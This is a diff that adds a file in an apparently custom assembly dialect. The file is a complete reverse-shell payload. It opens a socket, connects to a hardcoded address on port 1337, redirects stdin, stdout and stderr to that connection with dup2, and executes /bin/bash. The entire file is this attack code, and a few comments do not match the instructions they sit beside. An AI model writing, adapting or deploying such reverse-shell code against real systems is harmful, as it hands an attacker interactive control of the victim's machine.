@@ -1,0 +1,87 @@
+init:
+    ECALL   main
+
+exit:
+    # mov $0x3C, %rax
+    ESET    SRAX    0x1
+    
+    # mov $0x0, %rdi
+    ESET    SRBX    0x0
+    
+    SYSCALL
+
+main:
+
+    # sys_socket - open the socket and get file descriptor
+    ESET    SRAX    0x66    # 0x66 sys_socketcall
+    ESET    SRBX    0x1     # SYS_SOCKET  1 -- /usr/include/linux/net.h 
+    ESET    SRCX    SRSP
+    # Flip the orientation?
+    EPUSH   0x00000002
+    EPUSH   0x00000001
+    EPUSH   0x00000000
+    SYSCALL
+    POP
+    POP
+    POP
+    CLR
+
+    ESET    SR8     SRAX
+    # sys_connect - connect to the socket
+    ESET    SRAX    0x66    # 0x66 sys_socketcall
+    ESET    SRBX    0x3     # SYS_CONNECT  3 -- /usr/include/linux/net.h 
+
+    ESET    SR9     SRSP    # Get pointer to stack for sa_addr struct
+    # sa_addr struct as layed out in C program
+    EPUSH   0x39050002
+    EPUSH   0x1000007F
+    EPUSH   0xFFFFCCAC
+    EPUSH   0xFFFFCCAC
+
+    ESET    SRCX    SRSP
+    EPUSH   SR8
+    EPUSH   SR9
+    EPUSH   0x00000010
+
+    SYSCALL
+    POP
+    POP
+    POP
+    POP
+    POP
+    POP
+    POP
+    CLR
+
+    # sys_dup2  - duplicate stdin for the file descriptor
+    ESET    SRAX    0x3f    # 0x3f sys_dup2
+    ESET    SRBX    SR8
+    ESET    SRCX    0x0
+    SYSCALL
+
+    # sys_dup2  - duplicate stdout for the file descriptor
+    ESET    SRAX    0x3f    # 0x3f sys_dup2
+    ESET    SRCX    0x1
+    SYSCALL
+
+    # sys_dup2  - duplicate stderr for the file descriptor
+    ESET    SRAX    0x3f    # 0x3f sys_dup2
+    ESET    SRCX    0x2
+    SYSCALL
+
+    # sys_execve  - execute the shell command 
+    ESET    SRAX    0x0B    # 0x0B sys_execve
+    ESET    SRCX    0x0
+    ESET    SRDX    0x0
+
+    CLR
+    ESET    SRBX    SRSP
+    EPUSH   "/bin"
+    EPUSH   "/bas"
+    EPUSH   "h"
+    SYSCALL
+    POP
+    POP
+    POP
+
+    ECALL   exit
